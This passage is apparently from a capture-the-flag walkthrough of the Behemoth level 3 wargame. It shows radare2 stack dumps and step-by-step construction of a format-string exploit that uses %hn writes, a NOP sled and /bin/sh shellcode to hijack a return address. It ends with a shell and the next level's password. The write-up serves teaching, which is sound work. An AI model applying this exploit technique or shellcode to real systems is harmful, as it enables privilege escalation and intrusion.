[0xf7fdaa20]> dc
Identify yourself: Welcome, ��������000000c8.f7fc75a0.ffffd5ac.f7fe2fc9.         0
hit breakpoint at: 80484ca
[0x080484ca]> px 200 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd510  28d5 ffff c800 0000 a075 fcf7 acd5 ffff  (........u......
0xffffd520  c92f fef7 0000 0000 bcd5 ffff bed5 ffff  ./..............
0xffffd530  2530 3878 2e25 3038 782e 2530 3878 2e25  %08x.%08x.%08x.%
0xffffd540  3038 782e 2531 3075 2568 6e25 686e 0a00  08x.%10u%hn%hn..
0xffffd550  0000 0000 0100 0000 18d9 fff7 9fd5 ffff  ................
0xffffd560  9ed5 ffff 0100 0000 bf00 0000 3369 eaf7  ............3i..
0xffffd570  9ed5 ffff 9cd6 ffff e000 0000 0000 0000  ................
0xffffd580  00d0 fff7 18d9 fff7 a0d5 ffff 6282 0408  ............b...
0xffffd590  0000 0000 34d6 ffff 0070 fcf7 87c2 0000  ....4....p......
0xffffd5a0  ffff ffff 2f00 0000 c83d e2f7 a851 fdf7  ..../....=...Q..
0xffffd5b0  0080 0000 0070 fcf7 0000 0000 3600 3600  .....p......6.6.
0xffffd5c0  0100 0000 0000 0000 3058 e4f7 2b85 0408  ........0X..+...
0xffffd5d0  0100 0000 94d6 ffff                      ........
[0x080484ca]> 
```
We change the lower 16-bits to a value of 36 and the upper 16-bits to 36 as well. However, we need to change the two shorts separately. We can do that by adding in another "%u" between the two "%hn"s. However, we also need to add 4 junk bytes between the two adddresses at the beginning of our input for the %u to read. Otherwise, the second %hn will actually change the value at 0xffffd5c0.

At this point, let's add in our shellcode and NOP sled to the end of our input and then redetermine where the return address sits on the stack. After that, we can modify our "%u"s to be the appropriate values that causes the return address to point to one of the NOPs.

```bash
behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xbc\xd5\xff\xff" + "AAAA" + "\xbe\xd5\xff\xff" + "%08x.%08x.%08x.%08x.%10u.%hn%10u%hn" + "\x90"*50 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' > input.txt
behemoth3@behemoth:/tmp/smhbehemoth3$ r2 -de dbg.profile=profile.rr2 /behemoth/behemoth3 
Process with PID 30085 started...
= attach 30085 30085
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
 -- Enable ascii-art jump lines in disassembly by setting 'e asm.lines=true'. asm.linesout and asm.linestyle may interest you as well
[0xf7fdaa20]> db 0x080484ca
[0xf7fdaa20]> dc
Identify yourself: Welcome, ����AAAA����000000c8.f7fc75a0.ffffd5ac.f7fe2fc9.         0.1094795585��������������������������������������������������j1X̀�É�jFX̀1�Ph//shh/binT[PS��1Ұ

hit breakpoint at: 80484ca
[0x080484ca]> px 400 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd510  28d5 ffff c800 0000 a075 fcf7 acd5 ffff  (........u......
0xffffd520  c92f fef7 0000 0000 bcd5 ffff 4141 4141  ./..........AAAA
0xffffd530  bed5 ffff 2530 3878 2e25 3038 782e 2530  ....%08x.%08x.%0
0xffffd540  3878 2e25 3038 782e 2531 3075 2e25 686e  8x.%08x.%10u.%hn
0xffffd550  2531 3075 2568 6e90 9090 9090 9090 9090  %10u%hn.........
0xffffd560  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd570  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd580  9090 9090 9090 9090 906a 3158 cd80 89c3  .........j1X....
0xffffd590  89c1 6a46 58cd 8031 c050 682f 2f73 6868  ..jFX..1.Ph//shh
0xffffd5a0  2f62 696e 545b 5053 89e1 31d2 b00b cd80  /binT[PS..1.....
0xffffd5b0  0a00 0000 0070 fcf7 0000 0000 3b00 4500  .....p......;.E.
0xffffd5c0  0100 0000 0000 0000 3058 e4f7 2b85 0408  ........0X..+...
0xffffd5d0  0100 0000 94d6 ffff 9cd6 ffff 0185 0408  ................
0xffffd5e0  dc73 fcf7 0082 0408 e984 0408 0000 0000  .s..............
0xffffd5f0  0070 fcf7 0070 fcf7 0000 0000 37f6 e2f7  .p...p......7...
0xffffd600  0100 0000 94d6 ffff 9cd6 ffff 0000 0000  ................
0xffffd610  0000 0000 0000 0000 0070 fcf7 04dc fff7  .........p......
0xffffd620  00d0 fff7 0000 0000 0070 fcf7 0070 fcf7  .........p...p..
0xffffd630  0000 0000 8934 6f71 99da 284b 0000 0000  .....4oq..(K....
0xffffd640  0000 0000 0000 0000 0100 0000 8083 0408  ................
0xffffd650  0000 0000 f0ef fef7 8098 fef7 00d0 fff7  ................
0xffffd660  0100 0000 8083 0408 0000 0000 a183 0408  ................
0xffffd670  7d84 0408 0100 0000 94d6 ffff e084 0408  }...............
0xffffd680  4085 0408 8098 fef7 8cd6 ffff 18d9 fff7  @...............
0xffffd690  0100 0000 c9d7 ffff 0000 0000 ddd7 ffff  ................
[0x080484ca]> 
```

Our return address has moved to 0xffffd5fc. Let's attempt to set this value to be 0xffffd560 (right on one of our NOPs).

```
behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xfc\xd5\xff\xff" + "AAAA" + "\xfe\xd5\xff\xff" + "%08x.%08x.%08x.%08x.%54000u.%hn%u%hn" + "\x90"*50 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' > input.txt
0xffffd5f0  0070 fcf7 0070 fcf7 0000 0000 21d3 2bd3  .p...p......!.+.
[0x080484ca]> px 400 @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd510  28d5 ffff c800 0000 a075 fcf7 acd5 ffff  (........u......
0xffffd520  c92f fef7 0000 0000 fcd5 ffff 4141 4141  ./..........AAAA
0xffffd530  fed5 ffff 2530 3878 2e25 3038 782e 2530  ....%08x.%08x.%0
0xffffd540  3878 2e25 3038 782e 2535 3435 3735 752e  8x.%08x.%54575u.
0xffffd550  2568 6e25 3130 3931 3175 2568 6e90 9090  %hn%10911u%hn...
0xffffd560  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd570  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd580  9090 9090 9090 9090 9090 9090 9090 906a  ...............j
0xffffd590  3158 cd80 89c3 89c1 6a46 58cd 8031 c050  1X......jFX..1.P
0xffffd5a0  682f 2f73 6868 2f62 696e 545b 5053 89e1  h//shh/binT[PS..
0xffffd5b0  31d2 b00b cd80 0a00 0000 0000 2af3 e2f7  1...........*...
0xffffd5c0  0100 0000 0000 0000 3058 e4f7 2b85 0408  ........0X..+...
0xffffd5d0  0100 0000 94d6 ffff 9cd6 ffff 0185 0408  ................
0xffffd5e0  dc73 fcf7 0082 0408 e984 0408 0000 0000  .s..............
0xffffd5f0  0070 fcf7 0070 fcf7 0000 0000 60d5 ffff  .p...p......`...
0xffffd600  0100 0000 94d6 ffff 9cd6 ffff 0000 0000  ................
0xffffd610  0000 0000 0000 0000 0070 fcf7 04dc fff7  .........p......
0xffffd620  00d0 fff7 0000 0000 0070 fcf7 0070 fcf7  .........p...p..
0xffffd630  0000 0000 bb65 926b ab8b d551 0000 0000  .....e.k...Q....
0xffffd640  0000 0000 0000 0000 0100 0000 8083 0408  ................
0xffffd650  0000 0000 f0ef fef7 8098 fef7 00d0 fff7  ................
0xffffd660  0100 0000 8083 0408 0000 0000 a183 0408  ................
0xffffd670  7d84 0408 0100 0000 94d6 ffff e084 0408  }...............
0xffffd680  4085 0408 8098 fef7 8cd6 ffff 18d9 fff7  @...............
0xffffd690  0100 0000 c9d7 ffff 0000 0000 ddd7 ffff  ................
[0x080484ca]> 
```

We have the return address set. Let's stop using radare. We will need to determine the return address location on the stack once more now. We however can't use radare's features to print the stack and will have to determine a new method to determine this address.

If you look closely at the stacks and outputs above, you can see that the 3rd "%08x" is a value starting with 0xffffd5--. This is actually an address on the stack. If we determine the byte offset between the stack address and this value, we can calculate our new stack address that needs modified. From the stack prints above, the return address sits 80 bytes past 0xffffd5ac. 

Let's run the program with our input and see what that new pointer address becomes. Then we will add 0x50 onto it.
```bash
behemoth3@behemoth:/tmp/smhbehemoth3$ python -c 'print "\xfc\xd5\xff\xff" + "AAAA" + "\xfe\xd5\xff\xff" + "%08x.%08x.%08x.%08x.%54575u.%hn%10911u%hn" + "\x90"*50 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"' | /behemoth/behemoth3 
Identify yourself: Welcome, ����AAAA����000000c8.f7fc75a0.ffffd5cc.f7fe2fc9.
```
We see the value is now 0xffffd5cc. Adding 0x50 we get 0xffffd61c. Let's change our lower and upper 16-bit addresses to be 0xffffd61c and 0xffffd61e. We also need to change what value we assign in the lower 16-bits so we jump in our NOPs. Perform the same calculation in reference to a NOP now to determine the new "%u". And I throw a reminder that we may need to pass ";cat" to the executable too to keep the shell open once we get it.

```bash
behemoth3@behemoth:/tmp/smhbehemoth3$ (python -c 'print "\x1c\xd6\xff\xff" + "\xff\xff\xff\xff" + "\x1e\xd6\xff\xff" + "%08x.%08x.%08x.%08x.%54620u.%hn%10866u%hn" + "\x90"*50 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"';cat) | /behemoth/behemoth3
aaaand goodbye again.
whoami
behemoth4
ietheishei
```

Nice, we got the password to the next level.

I will add a link to a walkthrough on the rest of the behemoth levels as soon as they are written up. I hope you enjoyed the read. Please comment below if you have any questions or comments!
